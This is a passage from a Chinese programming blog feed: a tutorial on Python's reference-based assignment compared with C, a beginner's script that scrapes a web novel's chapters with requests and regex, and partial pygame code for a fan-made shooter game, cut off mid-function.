<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>这看上去似乎很好理解。第二步中， a 只是把值复制给 b，然后 b 又被更新为 5，a 和 b 是两个独立的变量，那么 a 的值当然不会受到影响。</p>
<p>真的是这样吗？</p>
<p>再来看一段代码：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="number">0</span>] = <span class="number">1024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1024</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>第二步中，a 只是复制把列表复制给 b，然后更新 b[0] 的值，最后输出 a，可是 a 竟然也被改变了。</p>
<p>按照代码 1 的逻辑（即变量之间独立），代码 2 的中的 a 不应该受到影响。</p>
<p>为什么出现了这样的差异？</p>
<h1 id="Python的反直觉"><a href="#Python的反直觉" class="headerlink" title="Python的反直觉"></a>Python的反直觉</h1><p>先不解释上面那个“看似矛盾”的问题。</p>
<p>先来看看另一组简单的 Python 代码在内存中是什么样子的：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">b = <span class="number">3</span></span><br><span class="line">b = b + <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>它在内存中的操作示意图是这样的：</p>
<p><img src="https://xorex.space/image/105.png"></p>
<p>然而，从代码的的字面意思上看，“把 3 赋给 b，把 b 加 5 之后再赋给 b。”</p>
<p>也就是把代码看成这个样子：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">b ← <span class="number">3</span></span><br><span class="line">b ← b + <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>所以下面这张在内存中的操作图可能更符合我们的直觉：</p>
<p><img src="https://xorex.space/image/106.png"></p>
<p>也即 b + 5 的值又写回到 b 中。典型的 C 程序就是这样的。为变量 b 分配一个 int 型的内存单元，然后将整数 3 存放在该内存单元中。b 就代表了该块内存空间，不再移动，可以更新 b 的值，但 b 在内存中的地址就不再变化了。所以我们说 b = b + 5，就等于 b ← b + 5，把 b 的值加 5 之后还依然放入 b 中。 变量 b 和它所在内存空间紧紧绑定在一起，人形合一。</p>
<p>而再看看上面 Python 中的内存示意图，b + 5 得到了一个新值，然后令 b 指向了这个新值。换句话说，它做的是事情是这样的：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">b → <span class="number">3</span></span><br><span class="line">b → b + <span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>先令 b 指向 3，再令 b 指向 b + 5 这个新值。</p>
<p>C 程序更新的是内存单元中存放的值，而 Python 更新的是变量的指向。<br>C 程序中变量保存了一个值，而 Python 中的变量指向一个值。</p>
<p>如果说 C 程序是通过操纵内存地址而间接操作数据(每个变量固定对应一个内存地址，所以说操纵变量就是操纵内存地址），数据处于被动地位，那么 Python 则是直接操纵数据，数据处于主动地位，变量只是作为一种引用关系而存在，而不再拥有存储功能。</p>
<p>在 Python 中，每一个数据都会占用一个内存空间，如 b + 5 这个新的数据也占用了一个全新的内存空间。</p>
<p>Python 的这种操作让数据成为主体，数据与数据之间直接进行交互。</p>
<p>一个整数 3 是一个 int 型对象，一个 ‘hello’ 是一个字符串对象，一个 [1, 2, 3] 是一个列表对象。</p>
<p>Python 把一切数据都看成「对象」。它为每一个对象分配一个内存空间。 一个对象被创建后，它的 id 就不再发生变化。</p>
<p>id 是 identity 的缩写。意为“身份；标识”。<br>在 Python 中，可以使用 id()，来获得一个对象的 id，可以看作是该对象在内存中的地址。</p>
<p>一个对象被创建后，它不能被直接销毁。因此，在上个例子中，变量 b 首先指向了对象 3，然后继续执行 b + 5，b + 5 产生了一个新的对象 8，由于对象 3 不能被销毁，则令 b 指向新的对象 8，而不是用对象 8 去覆盖对象 3。在代码执行完成后，内存中依然有对象 3，也有对象 8，变量 b 指向了对象 8。</p>
<p>如果没有变量指向对象 3（即无法引用它了），Python 会使用垃圾回收算法来决定是否回收它（这是自动的，不需要程序编写者操心）。</p>
<p>一个旧的对象不能被覆盖，因旧的对象交互而新产生的数据会放在新的对象中。也就是说每个对象是一个独立的个体，每个对象都有自己的“主权”。因此，两个对象的交互可以产生一个新的对象，而不会对原对象产生影响。在大型程序中，各个对象之间的交互错综复杂，这种独立性则使得这些交互足够安全。</p>
<p>C 程序为每个变量都分配一个了固定的内存地址，这保证了 C 变量之间的独立性。</p>
<p>C 语言是变量（也即内存地址）之间的交互，Python 是对象（数据）之间的交互。这是两种不同的交互方式。</p>
<p>那么，Python 这种数据之间直接进行交互的好处体现在哪里？</p>
<p>很遗憾，这并不是本文所要讨论的内容，该部分属于面向对象设计的核心内容。本文只是对 Python 的这种交互方式与 C 语言的交互方式做了一些比较，以区分两者在逻辑与物理上的差异所在。</p>
<p>相信这种逻辑会帮助你更好地编写 Python 程序，并且帮助你在日后更加深入地理解面向对象的程序设计。</p>
<p>Python 的赋值更改的是变量的指向关系，因此，对于 Python，从前向后阅读一个赋值表达式会更加容易理解。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; C 语言</span><br><span class="line">b ← b + 5   &#x2F;&#x2F; 把 b+5 的值赋给 b</span><br><span class="line"></span><br><span class="line"># Python</span><br><span class="line">b → b + 5   # 令 b 指向 b + 5</span><br></pre></td></tr></table></figure>
<h1 id="最开始的疑问"><a href="#最开始的疑问" class="headerlink" title="最开始的疑问"></a>最开始的疑问</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = <span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">3</span></span><br></pre></td></tr></table></figure>
<p>Python 中所有的数据都是对象，数字类型也不例外。3 是一个 int 类型的对象，5 也是一个 int 型的对象。<br>第一行，a 指向对象 3。<br>第二行，令 b 也指向 a 所指向的对象 3。<br>第三行，因为对象不可被覆盖（销毁），令 b 指向新对象 5，则只剩下 a 指向对象 3。<br>第四行，输出 a，得到 3。</p>
<p>在内存中的操作示意图 (Python)：</p>
<p><img src="https://xorex.space/image/107.png"></p>
<p>这与第一章中的解释完全不同，第一章中的解释是用 C 语言解释的：</p>
<p><img src="https://xorex.space/image/108.png"></p>
<p>这是两种完全不一样的机制。</p>
<p>Python 中 b 首先指向了对象 3，然而因为对象之间的独立性，一个对象不能去覆盖另一个对象，则令 b 指向对象 5，而不是将对象 3 在内存中替换为对象 5。</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b = a</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b[<span class="number">0</span>] = <span class="number">1024</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1024</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br></pre></td></tr></table></figure>
<p>第一行，令 a 指向一个列表 [1, 2, 3]；<br>第二行，令 b 也指向 a 所指向的列表；<br>第三行，令 b[0] = 1024，1024 虽然是一个对象，但它并没有试图覆盖b所指向的对象，而是对该对象的第一个元素进行修改。修改，而不是覆盖，所以它可以原对象进行操作，而不是令 b 指向修改后的对象。<br>所在第四行输出的 a 所指向的列表也发生了变化。</p>
<p>在内存中的操作示意图 (Python)：</p>
<p><img src="https://xorex.space/image/109.png"></p>
<p>这种对象的值可以修改的对象被称为可变对象 (immutable object)。常见的列表、字典为可变对象。</p>
<p>因为它的值可以被修改，因此如果有多个变量指向该列表：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = a</span><br><span class="line">c = a</span><br><span class="line">d = a</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
<p>那么使用 b, c, d, … 的任何一个变量都能访问该对象并修改其中的内容。这种特性常常被我们用于函数的参数传递，如果函数的参数是可变对象，那么函数可以对“实参”中的内容进行修改：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">change</span>(<span class="params">t</span>):</span></span><br><span class="line">        t[<span class="number">0</span>] = <span class="number">1024</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>change(a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="number">1024</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span> </span><br></pre></td></tr></table></figure>
<p>调用函数 change 时，令 t 也指向了 a 所指向的列表，然后使用 t 更改了列表中的第一个元素，更改，而不是覆盖，因此对 t 所指向的对象的更改也改变了“实参” a 所指向的对象。而 C 语言则因为实参到形参是值传递，则无法改变实参的内容（虽然借助指针可以实现，但这里只说一般情况下）。</p>
<p>但在函数以外的区域，我们要尽量避免这样使用，这很容易导致出错（当然，有时候会很有用，这取决于你的程序）。比如，在多人协作编程时，如果甲不小心修改了某可变对象，那么乙、丙、丁等用到该对象的人都会受到影响。</p>
<p>而对于不可变对象 (immutable object)，即其值无法更改的对象，传入函数时则不会影响“实参”的值：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = <span class="number">5</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">n</span>):</span></span><br><span class="line">        n = n + <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>add(a)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure>
<p>调用函数 add 时，令 n 也指向了 a 所指向的对象 5, 再执行 n = n + 2，n 所指向的对象 5 与对象 2 相加得到了一个新的对象 7，由于一个对象不能覆盖另一个对象，则 n 指向新的对象 7，而没有改变原对象。因此 a 的值未发生变化。虽然与 C 程序的结果一致，但与 C 程序的机制完全不同，C 程序之所以没改变 a，是因为调用函数时只发生了值传递，即只把 a 的值复制给了 n。</p>
<p>不要混淆这两种赋值逻辑，它们有着完全不同的物理实现方式。</p>
<p>不同的思维逻辑会导致不同的编写逻辑。尽管这两种逻辑在很多情况下的结果是一致的，但并不能就简单地认为它们是一致的。否则在一些小的细节方面出了错误，就会难以理解。只能死记硬背，把一些东西当作 Python 的特例来记，虽然「唯手熟尔」也可以让你走得很远，但思维正确时，不仅可以走得更远，也会走得更加轻松。</p>
<p>比如，当你的思维清晰时，以下问题的答案自然也就水落石出了：</p>
<p>为什么列表的方法的返回值大多是 None？<br>为什么字符串的方法的返回值大多是一个新的对象？<br>为什么 Python 中没有自增/自减运算符？<br>为什么有的可变对象传入函数之后，却不能被函数修改“实参”的值？<br>（比如将上面的 change 函数的主体改成 t = t[1:]。调用函数之后，a 所指向的对象并没有发生改变。）<br>……<br>这些内容与本文主题不大相关，所以不再列出答案。</p>
<h1 id="有趣的补充"><a href="#有趣的补充" class="headerlink" title="有趣的补充"></a>有趣的补充</h1><ol>
<li><p>数字是一个天然的不可变对象(immutable object)。<br>对于 n = n + 2，有人可能会说，为什么不能把它看成像列表那样的修改，修改后 n 依然指向的是原对象，这样的话执行 add(a) 之后，a 就会变成 7 了，可为什么不是这样？<br>因为每一个数字都是一个单个的对象，而对象不能覆盖对象。所以该句实际上是： a 指向的对象加上对象 2，产生了一个新的对象，然后令 a 指向了新对象 a + 2。<br>因此，数字类型并不存在修改这一说，它是一个天然的不可变对象。</p>
</li>
<li><p>为什么 Python 中没有自增(++)、自减(–)运算符？<br>自增或自减运算符，在 C 语言中很常用，简洁实用。但在 Python 中却一定不会有。上节说到，数字是天然的不可变对象，所谓自增就是自身增加，所以它无法自增。它只能从一个对象指向下一个对象。可以这样写 a += 1。</p>
</li>
<li><p>既然 Python 更改的只是引用关系，那么如何复制一个列表？</p>
</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">b = a</span><br><span class="line"><span class="comment"># 这样做不能复制一个列表，a 和 b 指向的都是列表 [1, 2, 3]</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 答案：</span></span><br><span class="line"><span class="comment">## 1. 使用 list 的 copy 方法</span></span><br><span class="line">b = a.copy()</span><br><span class="line"><span class="comment">## 2. 使用 slice 操作</span></span><br><span class="line">b = a[:]    <span class="comment"># slice 操作返回一个新的对象</span></span><br></pre></td></tr></table></figure>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>本文的章节安排是基于便于讲解的内容逻辑。这里给出文章的思维逻辑，以便回顾：</p>
<ol>
<li>Python 与 C 语言的赋值逻辑差异</li>
</ol>
<ul>
<li>一个直接操纵数据，一个间接操纵数据</li>
</ul>
<ol start="2">
<li>为什么需要这种赋值逻辑</li>
</ol>
<ul>
<li><p>帮助实现对象之间的交互</p>
</li>
<li><p>对象不可被直接摧毁（覆盖）</p>
</li>
<li><p>可以修改可变对象的值</p>
</li>
</ul>
<h1 id="原文地址"><a href="#原文地址" class="headerlink" title="原文地址"></a>原文地址</h1><p><a href="https://www.cnblogs.com/andywenzhi/p/7453374.html">如何理解 Python 的赋值逻辑</a></p>
]]></content>
      <categories>
        <category>开发知识</category>
      </categories>
      <tags>
        <tag>总结</tag>
        <tag>Python</tag>
      </tags>
  </entry>
  <entry>
    <title>Python-爬虫元尊小说</title>
    <url>/2019/07/06/6d2274b814c9/</url>
    <content><![CDATA[<h1 id="说在前面"><a href="#说在前面" class="headerlink" title="说在前面"></a>说在前面</h1><blockquote>
<p>早就听闻Python强大的爬虫功能，于是就想学习一波，有了上次在并夕夕成功的购买经历，于是我就又买了一本《Python3网络爬虫开发实践》。emmmm结果并不怎么样，写的并不是通俗易懂，全部都是专有名词，只能去求助连央视都夸的知名学习网站<code>bilibili</code>，成功入门!</p>
</blockquote>
<p><code>bilibili</code>网页链接: <a href="https://www.bilibili.com/video/av19954075">python新手强烈推荐教程：爬虫入门</a></p>
<p>下面记录一下这次学习过程：</p>
<h1 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h1><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests <span class="comment">#requests库是用来获取html的库</span></span><br><span class="line"><span class="keyword">import</span> re <span class="comment">#使用到正则表达式和删除不必要元素的库</span></span><br><span class="line"></span><br><span class="line">url=<span class="string">&#x27;http://www.ishisetianxia.com/chaojishenxiang/&#x27;</span> <span class="comment">#元尊小说地址</span></span><br><span class="line"></span><br><span class="line">output=<span class="built_in">open</span>(<span class="string">&#x27;YuanZun.out&#x27;</span>,<span class="string">&#x27;w&#x27;</span>,<span class="number">1</span>,<span class="string">&#x27;utf-8&#x27;</span>) <span class="comment">#元尊小说保存地址</span></span><br><span class="line"></span><br><span class="line">response=requests.get(url) <span class="comment">#获取网站的所有反馈</span></span><br><span class="line">response.encoding=<span class="string">&#x27;utf-8&#x27;</span> <span class="comment">#使用&#x27;utf-8&#x27;编码格式</span></span><br><span class="line">html=response.text <span class="comment">#.text可以返回网站反馈里面的网站html代码</span></span><br><span class="line"></span><br><span class="line">datas=re.findall(<span class="string">r&#x27;&lt;dd&gt;&lt;a href=&quot;(.*?)&quot; target=&quot;_blank&quot;&gt;(.*?)&lt;/a&gt;&lt;/dd&gt;&#x27;</span>,html,re.S) </span><br><span class="line"><span class="comment">#使用正则表达式获取每一章的网址和章节名，并用元组保存到datas里面</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> one <span class="keyword">in</span> datas: <span class="comment">#遍历每一个章节</span></span><br><span class="line">    new_url=<span class="string">&quot;http://www.ishisetianxia.com%s&quot;</span> %one[<span class="number">0</span>] <span class="comment">#拼接成完整的章节网址</span></span><br><span class="line">    new_response=requests.get(new_url) <span class="comment">#获取单个章节的url地址</span></span><br><span class="line">    new_response.encoding=<span class="string">&#x27;utf-8&#x27;</span> <span class="comment">#使用&#x27;utf-8&#x27;编码格式</span></span><br><span class="line">    new_html=new_response.text <span class="comment">#获取本章节的html源码</span></span><br><span class="line">    new_datas=re.findall(<span class="string">r&#x27;&lt;div id=&quot;BookText&quot;&gt;(.*?)&lt;script type=</span></span><br><span class="line"><span class="string">    &quot;text/javascript&quot; src=&quot;/tb.js&quot;&gt;&lt;/script&gt;&#x27;</span>,new_html,re.S)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#使用正则表达式获取小说内容</span></span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;[&#x27;&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;&#x27;]&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;&lt;p&gt;&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;&lt;/p&gt;&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;&amp;nbsp;&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;&lt;!--nextpage--&gt;&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    new_datas=new_datas.replace(<span class="string">&quot;本章完看《元尊》，就在www.ishisetianxia.com&quot;</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="comment">#使用replace删除小说中多余字符</span></span><br><span class="line">    output.write(<span class="built_in">str</span>(one[<span class="number">1</span>]))</span><br><span class="line">    output.write(<span class="built_in">str</span>(new_datas))</span><br><span class="line">    <span class="comment">#文件输出章节名和小说内容</span></span><br></pre></td></tr></table></figure>
<ul>
<li>大概就是这样，其实爬虫复杂的很，还需要慢慢的学习才行，总之加油吧！</li>
</ul>
]]></content>
      <categories>
        <category>项目记录</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title>Python实践-保护小雪乃</title>
    <url>/2019/06/26/01915b74a55c/</url>
    <content><![CDATA[<h1 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h1><blockquote>
<p><code>Python</code>的基础学习已经告一段落了，为了加强效果，实行第二阶段计划，编写一个名为「保护小雪乃」的游戏，来增强自己的代码能力。（其实是学习外星人入侵之后改编的）</p>
</blockquote>
<p><a href="https://github.com/Administrator-Xorex/Protect-Yukino">Github开源项目地址</a></p>
<h1 id="保护小雪乃"><a href="#保护小雪乃" class="headerlink" title="保护小雪乃"></a>保护小雪乃</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><blockquote>
<p>大老师军团来欺负雪乃了！怎么能看到世界第一可爱的雪之下雪乃受到欺负呢，快操控小雪乃发射消灭子弹，把大老师军团赶走，保护小雪乃！</p>
</blockquote>
<p><img src="https://xorex.space/image/104.jpg"></p>
<h2 id="玩法"><a href="#玩法" class="headerlink" title="玩法"></a>玩法</h2><ul>
<li><p>点击<code>Play</code>开始游戏</p>
</li>
<li><p>你可以使用左右键来操控小雪乃左右移动，使用空格键发射消灭子弹。</p>
</li>
<li><p>大老师军团会左右移动，到达边界会改变移动方向并向下移动一定距离。</p>
</li>
<li><p>如果任何一个大老师碰到小雪乃或者到达屏幕底端，吓到了小雪乃，那么就视为被欺负成功，减去一次机会。</p>
</li>
<li><p>每消灭一个大老师就会得到一定的小雪乃好感值，好感值无上限，并且会显示在屏幕右上角。</p>
</li>
<li><p>你的最高好感值会被保存下来，显示在屏幕正上方。</p>
</li>
<li><p>每消灭一波大老师军团，大老师愤怒等级+1，会派遣更加强大的大老师军团进攻（移动速度增加，消灭得到的好感值增加）</p>
</li>
<li><p>你的小雪乃拥有三次机会被大老师欺负，如果超过三次，就说明你并没有保护好小雪乃，游戏结束。</p>
</li>
<li><p>祝你好运！</p>
</li>
</ul>
<h2 id="素材"><a href="#素材" class="headerlink" title="素材"></a>素材</h2><ul>
<li>雪之下雪乃 <code>Yukinoshita-Yukino</code></li>
</ul>
<p><img src="https://xorex.space/image/102.jpg"></p>
<ul>
<li>比企谷八潘 <code>Hikigaya-Hachiman</code></li>
</ul>
<p><img src="https://xorex.space/image/103.jpg"></p>
<h2 id="start"><a href="#start" class="headerlink" title="start"></a>start</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"><span class="keyword">import</span> functions </span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> settings <span class="keyword">import</span> Settings</span><br><span class="line"><span class="keyword">from</span> yukino <span class="keyword">import</span> Yukino</span><br><span class="line"><span class="keyword">from</span> pygame.sprite <span class="keyword">import</span> Group</span><br><span class="line"><span class="keyword">from</span> teacher <span class="keyword">import</span> Teacher</span><br><span class="line"><span class="keyword">from</span> stats <span class="keyword">import</span> GameStats</span><br><span class="line"><span class="keyword">from</span> button <span class="keyword">import</span> Button</span><br><span class="line"><span class="keyword">from</span> scoreboard <span class="keyword">import</span> Scoreboard</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_game</span>():</span></span><br><span class="line">    pygame.init()</span><br><span class="line">    number=Settings()</span><br><span class="line">    screen=pygame.display.set_mode((number.screen_width,number.screen_height))</span><br><span class="line">    play_button=Button(number,screen,<span class="string">&quot;Play&quot;</span>)</span><br><span class="line">    pygame.display.set_caption(<span class="string">&quot;Yukinoshita-Yukino&#x27;s attack&quot;</span>)</span><br><span class="line"></span><br><span class="line">    stats=GameStats(number)</span><br><span class="line">    sb=Scoreboard(number,screen,stats)</span><br><span class="line">    yukino=Yukino(number,screen)</span><br><span class="line">    bullets=Group()</span><br><span class="line">    teachers=Group()</span><br><span class="line">    functions.create_fleet(number,screen,yukino,teachers)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        functions.check_events(number,screen,stats,sb,play_button,yukino,teachers,bullets)</span><br><span class="line">        <span class="keyword">if</span> stats.game_active:</span><br><span class="line">            yukino.update()</span><br><span class="line">            functions.update_bullets(number,screen,stats,sb,yukino,teachers,bullets)</span><br><span class="line">            functions.update_teachers(number,screen,stats,sb,yukino,teachers,bullets)</span><br><span class="line">        functions.update_screen(number,screen,stats,sb,yukino,teachers,bullets,play_button)</span><br><span class="line"></span><br><span class="line">run_game()</span><br><span class="line"></span><br><span class="line">a=<span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>
<h2 id="stats"><a href="#stats" class="headerlink" title="stats"></a>stats</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GameStats</span>():</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,number</span>):</span></span><br><span class="line">        self.number=number</span><br><span class="line">        self.reset_stats()</span><br><span class="line">        self.game_active=<span class="literal">False</span></span><br><span class="line">        self.high_score=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">reset_stats</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.yukino_left=self.number.yukino_limit</span><br><span class="line">        self.score=<span class="literal">False</span></span><br><span class="line">        self.level=<span class="number">1</span></span><br></pre></td></tr></table></figure>
<h2 id="functions"><a href="#functions" class="headerlink" title="functions"></a>functions</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> pygame</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> bullet <span class="keyword">import</span> Bullet</span><br><span class="line"><span class="keyword">from</span> teacher <span class="keyword">import</span> Teacher</span><br><span class="line"><span class="keyword">from</span> time <span class="keyword">import</span> sleep</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_keydown_events</span>(<span class="params">event,number,screen,yukino,bullets</span>):</span></span><br><span class="line">    <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">        yukino.moving_right=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> event.key==pygame.K_LEFT:</span><br><span class="line">        yukino.moving_left=<span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> event.key==pygame.K_SPACE:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(bullets)&lt;number.bullets_allowed:</span><br><span class="line">            new_bullet=Bullet(number,screen,yukino)</span><br><span class="line">            bullets.add(new_bullet)</span><br><span class="line">    <span class="keyword">elif</span> event.key==pygame.K_q:</span><br><span class="line">        sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_keyup_events</span>(<span class="params">event,yukino</span>):</span></span><br><span class="line">    <span class="keyword">if</span> event.key==pygame.K_RIGHT:</span><br><span class="line">        yukino.moving_right=<span class="literal">False</span></span><br><span class="line">    <span class="keyword">elif</span> event.key==pygame.K_LEFT:</span><br><span class="line">        yukino.moving_left=<span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_events</span>(<span class="params">number,screen,stats,sb,play_button,yukino,teachers,bullets</span>):</span></span><br><span class="line">    <span class="keyword">for</span> event <span class="keyword">in</span> pygame.event.get():</span><br><span class="line">            <span class="keyword">if</span> event.<span class="built_in">type</span>==pygame.QUIT:</span><br><span class="line">                sys.exit()</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span>==pygame.KEYDOWN:</span><br><span class="line">                check_keydown_events(event,number,screen,yukino,bullets)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span>==pygame.KEYUP:</span><br><span class="line">                check_keyup_events(event,yukino)</span><br><span class="line">            <span class="keyword">elif</span> event.<span class="built_in">type</span>==pygame.MOUSEBUTTONDOWN:</span><br><span class="line">                mouse_x,mouse_y=pygame.mouse.get_pos()</span><br><span class="line">                check_play_button(number,screen,stats,sb,play_button,</span><br><span class="line">                yukino,teachers,bullets,mouse_x,mouse_y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_play_button</span>(<span class="params">number,screen,stats,sb,play_button,yukino,teachers,bullets,mouse_x,mouse_y</span>):</span></span><br><span class="line">    button_clicked=play_button.rect.collidepoint(mouse_x,mouse_y)</span><br><span class="line">    <span class="keyword">if</span> button_clicked <span class="keyword">and</span> <span class="keyword">not</span> stats.game_active:</span><br><span class="line">        number.initialize_dynamic_settings()</span><br><span class="line">        pygame.mouse.set_visible(<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> play_button.rect.collidepoint(mouse_x,mouse_y):</span><br><span class="line">            stats.reset_stats()</span><br><span class="line">            stats.game_active=<span class="literal">True</span></span><br><span class="line"></span><br><span class="line">            sb.prep_score()</span><br><span class="line">            sb.prep_high_score()</span><br><span class="line">            sb.prep_level()</span><br><span class="line">            sb.prep_yukino()</span><br><span class="line"></span><br><span class="line">            teachers.empty()</span><br><span class="line">            bullets.empty()</span><br><span class="line">            create_fleet(number,screen,yukino,teachers)</span><br><span class="line">            yukino.center_yukino()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_fleet_edges</span>(<span class="params">number,teachers</span>):</span></span><br><span class="line">    <span class="keyword">for</span> teacher <span class="keyword">in</span> teachers.sprites():</span><br><span class="line">        <span class="keyword">if</span> teacher.check_edges():</span><br><span class="line">            change_fleet_direction(number,teachers)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_bullet_teacher_collisions</span>(<span class="params">number,screen,stats,sb,yukino,teachers,bullets</span>):</span></span><br><span class="line">    collisions=pygame.sprite.groupcollide(bullets,teachers,<span class="literal">True</span>,<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> collisions:</span><br><span class="line">        <span class="keyword">for</span> teachers <span class="keyword">in</span> collisions.values():</span><br><span class="line">            stats.score+=number.teacher_points*<span class="built_in">len</span>(teachers)</span><br><span class="line">            sb.prep_score()</span><br><span class="line">        check_high_score(stats,sb)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(teachers)==<span class="literal">False</span>:</span><br><span class="line">        bullets.empty()</span><br><span class="line">        number.increase_speed()</span><br><span class="line">        stats.level+=<span class="number">1</span></span><br><span 